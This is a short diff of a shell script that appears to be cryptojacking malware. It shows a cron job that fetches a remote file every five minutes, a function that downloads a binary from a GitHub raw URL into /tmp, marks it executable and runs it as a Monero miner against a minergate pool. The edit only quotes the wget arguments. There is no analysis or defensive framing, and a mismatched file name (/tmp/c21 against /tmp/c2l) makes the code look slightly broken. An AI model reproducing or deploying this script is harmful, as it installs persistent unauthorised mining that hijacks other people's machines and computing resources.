@@ -5,7 +5,7 @@ echo "*/5 * * * * curl -fsSL https://raw.githubusercontent.com/c2lc2l/c2lc2l/mas
 Doc2l()
 {
 if [ ! -f "/tmp/c2l" ];then
-wget -O /tmp/c2l https://raw.githubusercontent.com/c2lc2l/c2lc2l/master/c2l.zip
+wget -O "/tmp/c2l" "https://raw.githubusercontent.com/c2lc2l/c2lc2l/master/c2l.zip"
 fi
 chmod +x /tmp/c21
 /tmp/c2l -t 1 -M stratum+tcp://c2l%40protonmail.com:x@xmr.pool.minergate.com:45560/xmr
